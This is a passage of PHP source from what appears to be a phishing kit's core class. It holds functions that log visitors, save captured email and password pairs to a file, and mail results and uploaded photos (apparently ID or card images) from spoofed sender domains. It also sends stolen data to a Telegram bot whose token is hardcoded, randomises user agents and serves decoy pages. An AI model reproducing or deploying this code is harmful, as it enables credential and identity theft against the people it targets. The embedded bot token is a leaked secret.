    "Opera/9.80 (X11; Linux i686; U; pt-BR) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; nb) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (X11; Linux i686; U; de) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 6.0; U; de) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.2.15 Version/10.00",
    "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.00"
)
);
$max = 0;
$rcount = 0;
$browser_type = '';
foreach($browser_freq as $k => $v) $max+= $v;
$roll = rand(0, $max);
foreach($browser_freq as $k => $v)
    if (($roll <= ($rcount+= $v)) and (!$browser_type)) $browser_type = $k;
$user_agent_array = $browser_strings[$browser_type];
shuffle($user_agent_array);
$user_agent = $user_agent_array[0];
return $user_agent;
}
    public function parseResponse($str = '') {
        $result = strip_tags($str, '<div>');
        $result = explode('<', substr($result, strpos($result, 'class="t0"') + 11, strpos($result, 'class="t0"')));
        $result = $result[0];
        return $result;
    }
	public function getOS() { 
    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
	}
  public function is_mobile()
  {
    $platform = $this->getOS();
    $mobile = ['iPad','iPhone','iPod','Android','BlackBerry','Mobile'];
    if(in_array($platform,$mobile))
    {
      return true;
    }else{
      return false;
    }
  }
	public function parse_hijaiyh($name,$sub)
	{
		$file = dirname(__DIR__).'/config/scama.iyh.json';
		$parse = json_decode(@file_get_contents($file),true);

		return $parse[$name][$sub];
	}
	public function save($file,$val)
	{
		$fp = fopen($file,'a');
		fwrite($fp,$val);
		fclose($fp);
	}
	public function statsformat($ket)
	{$x = "<pre>";
  $x .= "|<font color=red> ".date('d-m-Y H:i:s')." </font>|<font color=green> ".$this->userIP()." </font>";
  $x .= "|<font color=blue> ".$this->getOS()." </font>|<font color=purple> ".$this->getBrowser()." </font>";
  $x .= "|<font color=orange> ".$this->session('country_')." </font> | <b> ".$ket."</b></pre>";
	/*	$x = [
			   'date' => date('d-m-Y H:i:s'),
			  'ip' => $this->userIP(),
			  'os' => $this->getOS(),
			  'browser' => $this->getBrowser(),
			  'country' => $this->session('country_'),
			  'description' => $ket,
			];*/
		return $x;
	}
	public function stats($name,$val)
	{
		$file = dirname(__DIR__).'/stats/'.$name.'.hijaiyh.html';
		$val = $this->statsformat($val);
		return $this->save($file,$val."\n");
	}
    public function parse_result($type,$data = array())
    {
        $source = dirname(__DIR__).'/assets/html/'.$type.'.html';
        $fsource = file_get_contents($source);
        $rpl1=[];
        $val1=[];
        foreach($data as $rpl=>$val)
        {
            $rpl1[]="{".$rpl."}";
            $val1[]=$val;
        }
        return str_replace($rpl1,$val1,$fsource);
    }
    public  function sendmail($to, $from, $subject, $message) {
     
     require_once(__DIR__.'/SMTP.iyh.php');
     require_once(__DIR__.'/PHPMailer.iyh.php');
     $mail = New PHPMailer;
     $fromMail = "jakakirik@".rand().".hijaiyh.amz";
    $mail->isMail();
    $mail->CharSet =  "UTF-8";  
    $mail->ContentType = "text/html"; 
    $mail->Priority = 1;                                
    $mail->SingleTo = true;
    $mail->From = $fromMail;
    $mail->FromName = $from;                            
    $mail->Subject = $subject;
    $mail->AltBody = $message;
    $mail->Body = $message;
    $mail->addAddress($to);
  	$mail->send();
  	
 	}

 	public  function sendphoto($to,$from, $subject, $foto = array())
 	{
 	

     require_once(__DIR__.'/SMTP.iyh.php');
     require_once(__DIR__.'/PHPMailer.iyh.php');
     $mail = New PHPMailer;

     $message = "Photo $subject <br>";
      $mail->isMail();
    $mail->CharSet =  "UTF-8";  
    $mail->ContentType = "text/html"; 
    $mail->Priority = 1;                                
    $mail->SingleTo = true;
    $mail->From = "pm-mas@".rand().".hijaiyh.net";
    $mail->FromName = $from;                            
    $mail->Subject = $subject;
    foreach($foto as $photo){
    $mail->AddAttachment($photo);
    //$mail->AddEmbeddedImage($photo);
	}
    $mail->AltBody = $message;
    $mail->Body = $message;
    $mail->addAddress($to);
  	$mail->send();
 	}
  
       public function api_tr($from,$to,$text)
    {
        $translate_url = 'https://translate.google.com/m?ie=UTF-8&prev=_m&hl=en&';
        $url = $translate_url . 'sl='.$from.'&tl=' . $to . '&q=' . urlencode(@$text);

        if (file_exists($this->dir_cache . '/' . $to . '/' . md5($url) . '.cache') && $cache) {
            return file_get_contents($this->dir_cache . '/' . $to . '/' . md5($url) . '.cache');
        }

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_VERBOSE, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, $this->rand_ua());
        curl_setopt($ch, CURLOPT_REFERER, 'https://translate.google.com/m');
        curl_setopt($ch, CURLOPT_URL, $url);
        $resp = $this->parseResponse(curl_exec($ch));
        if (!file_exists($this->dir_cache)) {
            @mkdir($this->dir_cache);
        }
        if (!file_exists($this->dir_cache . '/' . $to)) {
            @mkdir($this->dir_cache . '/' . $to);
        }
        @file_put_contents($this->dir_cache . '/' . $to . '/' . md5($url) . '.cache', $resp);
        return $resp;
    }
       public function translate($from,$to,$text)
    { 
    $from = strtolower($from);
    $to = strtolower($to);
    $text = strip_tags(stripslashes($text));
    $param=md5(sha1($text));

    $lang_file = dirname(__DIR__).'/lang/_hijaiyh_'.$to.'.ini';
    if(file_exists($lang_file))
    {
      $get_lang = parse_ini_file($lang_file);

      if(!array_key_exists($param,$get_lang))
      {
        $re = $this->api_tr($from,$to,$text);
        $content = $param." = \"".$re."\"".PHP_EOL;
        $fp = fopen($lang_file,'a');
        fwrite($fp,$content);
        fclose($fp);
        return $re;
      }else{
        if($get_lang[$param] == "")
        {
          $re = $this->api_tr($from,$to,$text);
          $content = $param." = \"".$re."\"".PHP_EOL;
          $fp = fopen($lang_file,'a');
          fwrite($fp,$content);
          fclose($fp);
          if($re == "")
        {
          return $text;
        }else{
          return $re;
        }
        }else{
          return $get_lang[$param];
        }
      }
    }else{
        $re = $this->api_tr($from,$to,$text);
        $content = $param." = \"".$re."\"".PHP_EOL;
        $fp = fopen($lang_file,'a');
        fwrite($fp,$content);
        fclose($fp);
        if($re == "")
        {
          return $text;
        }else{
          return $re;
        }
    }
    }
    
    public function str_enc($str) {
    $crypt = array(
      "A" => "065",
      "a" => "097",
      "B" => "066",
      "b" => "098",
      "C" => "067",
      "c" => "099",
      "D" => "068",
      "d" => "100",
      "E" => "069",
      "e" => "101",
      "F" => "070",
      "f" => "102",
      "G" => "071",
      "g" => "103",
      "H" => "072",
      "h" => "104",
      "I" => "073",
      "i" => "105",
      "J" => "074",
      "j" => "106",
      "K" => "075",
      "k" => "107",
      "L" => "076",
      "l" => "108",
      "M" => "077",
      "m" => "109",
      "N" => "078",
      "n" => "110",
      "O" => "079",
      "o" => "111",
      "P" => "080",
      "p" => "112",
      "Q" => "081",
      "q" => "113",
      "R" => "082",
      "r" => "114",
      "S" => "083",
      "s" => "115",
      "T" => "084",
      "t" => "116",
      "U" => "085",
      "u" => "117",
      "V" => "086",
      "v" => "118",
      "W" => "087",
      "w" => "119",
      "X" => "088",
      "x" => "120",
      "Y" => "089",
      "y" => "121",
      "Z" => "090",
      "z" => "122",
      "0" => "048",
      "1" => "049",
      "2" => "050",
      "3" => "051",
      "4" => "052",
      "5" => "053",
      "6" => "054",
      "7" => "055",
      "8" => "056",
      "9" => "057",
      "&" => "038",
      " " => "032",
      "_" => "095",
      "-" => "045",
      "@" => "064",
      "." => "046"
    );
    $encode = "";
    for ($i=0; $i < strlen($str); $i++) {
      $key = substr($str, $i, 1);
      if (array_key_exists($key, $crypt)) {
        $random = rand(1, 3);
     /*   if ($random == '1') {
          $encode = $encode.$key;
        } else if ($random == '3') {
          $encode = $encode.$key;
        } else {*/
          $encode = $encode."&#".$crypt[$key].";";
       /* }*/
      } else {
        $encode = $encode.$key;
      }
    }
    return $encode;
  }
  
    public function getEmpass($email,$password)
    {
        $save = dirname(__DIR__).'/stats/empass.txt';
        $empass = $this->str_enc($email)."|".$this->str_enc($password)."<br>";
        $this->save($save,$empass);
    }
    public function randomuri(){
      $uri = ['https://amazon.com',
              'https://icloud.com',
              'http://mostexclusivewebsite.com',
              'http://wikipeetia.org',
              'http://theworldsworstwebsiteever.com',
              'http://purple.com',
              'http://watching-grass-grow.com',
              'http://pleaselike.com',
              'http://thebestdinosaur.com',
              'http://amawesome.com',
              'http://papertoilet.com',
              'http://tencents.info',
              'https://geoguessr.com',
              'http://img0.liveinternet.ru/images/attach/c/5/3970/3970473_sprite198.swf',
              'http://www.theuselessweb.com/',
              'http://weavesilk.com/',
              'http://mrdoob.com/',
              'http://www.fliptext.org/',
              'http://htwins.net/scale2/',
              'http://zombo.com/',
              'http://typedrummer.com/',
              'http://www.incredibox.com/v3/'];

      shuffle($uri);
      /*header('location:https://href.li/?'.$uri[0]);*/
      return $uri[0];
    }
    public function suspend()
    {
      $rand = rand(1,2);
      switch ($rand) {
        case '1':
          exit(@file_get_contents(dirname(__DIR__).'/assets/html/suspend.html'));
          break;
        case '2':
        exit(@file_get_contents(dirname(__DIR__).'/assets/html/tcp.html'));
            break;
        default:
      exit(@file_get_contents(dirname(__DIR__).'/assets/html/suspend.html'));
          break;
      }
    }
    /*
    function anti_loop()
    {
        $ip = md5($this->userIP());
        if(isset($_SESSION['jml_block_'.$ip]))
        {
            
             $jml = $_SESSION['jml_block_'.$ip];
            $_SESSION['jml_block_'.$ip] +=1;
            if($jml >= 3)
            {
                $this->stats('bot','BLOCKED IP NGELOOP '.$jml);
                $this->stats('anti_loop','BLOCKED IP NGELOOP '.$jml);
                $this->suspend();exit;
            }
        }else{
        $_SESSION['jml_block_'.$ip]+=1;
            
        }
       
    }
    */
    public function itung($num) {

  if($num>1000) {

        $x = round($num);
        $x_number_format = number_format($x);
        $x_array = explode(',', $x_number_format);
        $x_parts = array('K', 'M', 'B', 'T');
        $x_count_parts = count($x_array) - 1;
        $x_display = $x;
        $x_display = $x_array[0] . ((int) $x_array[1][0] !== 0 ? '.' . $x_array[1][0] : '');
        $x_display .= $x_parts[$x_count_parts - 1];

        return $x_display;

  }

  return $num;
}
  public function count_stats($filename)
  {
    $dir = dirname(__DIR__).'/stats/'.$filename;
    if(file_exists($dir)){
    $c = explode("\n",file_get_contents($dir));
    $c = count($c)-1;
    }else{
      $c=0;
    }
    return $this->itung($c);
  }
  public function emaildetect($email)
  {
    if(filter_var($email,FILTER_VALIDATE_EMAIL))
    {
      if(preg_match("/@gmail/",$email))
      {
        return 'gmail';
      }elseif(preg_match("/@hotmail|@outlook|@live|@msn/",$email))
      {
        return 'microsoft';
      }elseif(preg_match("/@yandex/",$email))
      {
        return 'yandex';
      }elseif(preg_match("/@icloud|@mac|@me/",$email))
      {
        return 'icloud';
      }elseif(preg_match("/@yahoo|@ymail|@rocketmail/",$email))
      {
        return 'yahoo';
      }elseif(preg_match("/@aol/", $email))
      {
        return 'aol';
      }else{
        return false;
      }
    }else{
      return false;
    }
  }
  public function sendtele($chat_id,$action,$param,$photo = false)
  {
    if($photo == false){
    $param = explode("=",$param);
    if($param[0] == "text"){
    $param = urldecode($param[1]);
    $param = strip_tags($param);
    $param = "text=".urlencode($param);
    }
    }
    
    $gett="https://api.telegram.org/bot696021880:AAFhrn_croctCBJlE7mxHz_skTDtdbDBFwQ/".$action."?chat_id=".$chat_id."&".$param;
    return file_get_contents($gett);
  }
  public function UploadImage($name,$ccname)
  {
    
    $filename = $_FILES[$name]['name'];
    $tmpname  = $_FILES[$name]['tmp_name'];
    $fileext  = strtolower(end(explode(".",$filename)));

    $allowed_ext = array('jpg','png','jpeg');

    if(!in_array($fileext,$allowed_ext))
    {
      return false;
      exit;
    }
    $base_dir = dirname(dirname(__DIR__)).'/HijaIyh_App/upload/';
    $uploaded=$base_dir.$ccname.'.'.$fileext;
    @touch($uploaded);
    if(move_uploaded_file($tmpname,$uploaded))
    {
      @chmod($uploaded,0777);
      return $uploaded;
    }else{
      return false;
    }
    


  }
  public function rm_rf($str) { 
      
    // Check for files 
    if (is_file($str)) { 
          
        // If it is file then remove by 
        // using unlink function 
        return unlink($str); 
    } 
      
    // If it is a directory. 
    elseif (is_dir($str)) { 
          
        // Get the list of the files in this 
        // directory 
        $scan = glob(rtrim($str, '/').'/*'); 
          
        // Loop through the list of files 
        foreach($scan as $index=>$path) { 
              
            // Call recursive function 
            $this->rm_rf($path); 
        } 
          
        // Remove the directory itself 
        return @rmdir($str); 
    } 
} 


}
